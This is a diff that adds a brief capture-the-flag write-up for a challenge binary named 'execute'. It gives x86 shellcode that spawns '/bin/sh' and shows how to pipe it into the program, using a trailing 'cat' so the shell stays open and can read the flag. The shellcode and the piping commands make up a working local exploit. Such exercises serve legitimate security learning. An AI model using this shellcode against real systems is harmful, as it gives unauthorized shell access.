@@ -1,0 +1,11 @@
+In the code, we see that the program will execute anything within our buffer. However, what it's reading is
+shellcode. So, we want to execute '/bin/sh' so we can read and do whatever.
+/bin/sh in shellcode is '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+If we do
+
+    python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'" | ./execute
+
+We don't get anything, since the program is exiting before we can execute anything. So, if we add another command to it, like
+cat, we can execute commands and get the flag.
+
+    (python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; cat) | ./execute
